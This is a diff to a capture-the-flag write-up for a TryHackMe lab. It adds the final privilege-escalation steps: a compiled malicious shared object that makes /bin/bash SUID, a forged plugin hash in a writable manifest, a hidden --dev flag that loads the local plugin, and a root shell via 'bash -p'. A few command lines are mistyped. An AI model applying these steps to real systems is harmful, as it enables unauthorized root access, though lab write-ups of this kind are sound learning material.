@@ -409,8 +409,8 @@ We create a malicios c file to make /bin/bash SUID. Compile the c file.
 aphrodite@tryhackme-2404:/tmp$ gcc -shared -fPIC -o exploit.so exploit.c
 ```
 ```bash
-aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ sha256sum /tmp/exploit.so
-cf4949ff813a7e1a8b60b7bc1ce6d842a4a7bcf1740152a3daf14b19b9afb094  /tmp/exploit.s
+aphrodite@tryhackme-2404:/tmp$ sha256sumexploit.so
+cf4949ff813a7e1a8b60b7bc1ce6d842a4a7bcf1740152a3daf14b19b9afb094 exploit.s
 ```
 
 Since, we have write permissions in manifest.json, we can edit the hash with our hash.
@@ -420,13 +420,18 @@ aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ cat manifest.json
 {
   "plugins": {
     "rosepetal": {
-      "hash": "cf4949ff813a7e1a8b60b7bc1ce6d842a4a7bcf1740152a3daf14b19b9afb094",
+      "hash": "f7fb2b551f107ee61e20de29d153e1de027b44e50fd70cc50af36e08adc3b3bf",
       "description": "Rose petal animation plugin",
       "version": "1.0"
     },
     "loveletter": {
       "hash": "b47a17238fb47b6ef9d0d727453b0335f5bd4614cf415be27516d5a77e5f4643",
       "description": "Love letter formatter plugin",
+      "version": "1.0"
+    },
+    "exploit": {
+      "hash": "cf4949ff813a7e1a8b60b7bc1ce6d842a4a7bcf1740152a3daf14b19b9afb094",
+      "description": "Give me root plugin",
       "version": "1.0"
     }
   }
@@ -436,14 +441,64 @@ aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ cat manifest.json
 Let's run to see if this works.
 
 ```bash
-aphrodite@tryhackme-2404:/opt/heartbreak/plugins$ /usr/local/bin/heartstring plugin rosepetal
-Error: plugin integrity check failed.
-  Expected: cf4949ff813a7e1a8b60b7bc1ce6d842a4a7bcf1740152a3daf14b19b9afb094
-  Got:      f7fb2b551f107ee61e20de29d153e1de027b44e50fd70cc50af36e08adc3b3bf
+aphrodite@tryhackme-2404:~$ /usr/local/bin/heartstring plugin exploit
+Error: plugin 'exploit' not found.
 ```
 
-We get a integrity check fail error.
+I think we are missing some command, let's see the binary strings.
 
-To be continued......
+```bash
+aphrodite@tryhackme-2404:/tmp$ strings /usr/local/bin/heartstring
+/lib64/ld-linux-x86-64.so.2
+mgUa
+__gmon_start__
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+SHA256_Init
+SHA256_Final
+SHA256_Update
+.
+.
+.
+.
+.
+Commands:
+/opt/heartbreak/plugins
+%s/%s.so
+--dev
+[dev] Using local plugin: %s
+"%s"
+Error: cannot read manifest.
+"hash"
+```
 
+We find a --dev tag, which is needed for using a local plugin.
 
+```bash
+aphrodite@tryhackme-2404:/tmp$ /usr/local/bin/heartstring plugin exploit --dev
+[dev] Using local plugin: /tmp/exploit.so
+Loading plugin 'exploit'...
+Plugin 'exploit' loaded successfully.
+```
+
+Let's check if /bin/bash is SUID now.
+
+```bash
+aphrodite@tryhackme-2404:/tmp$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+```
+
+Yay! The exploit worked, now we can become root.
+
+```bash
+aphrodite@tryhackme-2404:~$ /bin/bash -p
+bash-5.2# id
+uid=1002(aphrodite) gid=1003(aphrodite) euid=0(root) egid=0(root) groups=0(root),1002(lovers),1003(aphrodite),1004(hearts)
+```
+
+Let's read the final flag and end this challenge.
+
+```bash
+bash-5.2# cat flag3.txt
+THM{h3....._u}
+```
